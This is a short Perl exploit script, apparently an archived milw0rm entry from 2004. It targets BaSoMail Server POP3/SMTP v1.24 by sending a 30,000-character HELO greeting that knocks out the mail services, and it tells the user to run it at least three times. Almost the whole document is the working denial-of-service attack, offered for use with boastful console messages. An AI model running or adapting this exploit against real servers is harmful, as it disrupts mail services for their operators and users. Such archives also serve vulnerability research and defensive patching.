#!/usr/bin/perl


###############################################
#  BaSoMail Server POP3 and SMTP v1.24 D.o.S  #	
#  Discovered by Ziv Kamir,exploited by KaGra #
#					      #
#  This Sploit sends as HELO request 1 packet #
#  of 30K of data.If U use it at least 3 times#
#   SMTP and POP services will be D.o.Sed.    #
#     	 Tested in WinXP SP1 EnGlish	      #	
###############################################




use Net::SMTP;
print "\n[*]BuiLDinG BuFfer...\n";
$evil = 'A'x30000   ;

print "[*]@@@...SenDing DeViL...HeLL UnleaSheD...wait at least 30 seconds...@@@\n";

$smtp = Net::SMTP->new('localhost',
			Hello=>$evil,
			Timeout=>30,
			
			);

print "\nTarGet Has BeeN D.o.Sed,use Exploit at Least 3 times \n";
print "and then check if Server aLiVe!\n\n";

# milw0rm.com [2004-10-24]
